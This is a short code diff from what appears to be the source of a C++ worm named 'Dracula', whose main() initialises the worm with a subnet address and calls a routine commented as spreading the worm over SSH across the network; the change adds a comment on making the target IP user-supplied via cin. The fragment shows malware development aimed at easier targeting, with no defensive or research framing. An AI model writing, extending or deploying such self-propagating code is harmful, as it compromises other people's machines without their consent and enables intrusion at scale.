@@ -106,7 +106,7 @@ public:
 
 int main() {
     // Initialize dracula object with the network address "192.168.0.0"
-    Dracula dracula("192.168.0.0");
+    Dracula dracula("192.168.0.0"); // you can dynamically initialize the IP by using the cin function
 
     // Spread the worm via SSH connection on the network
     dracula.spread_via_ssh();
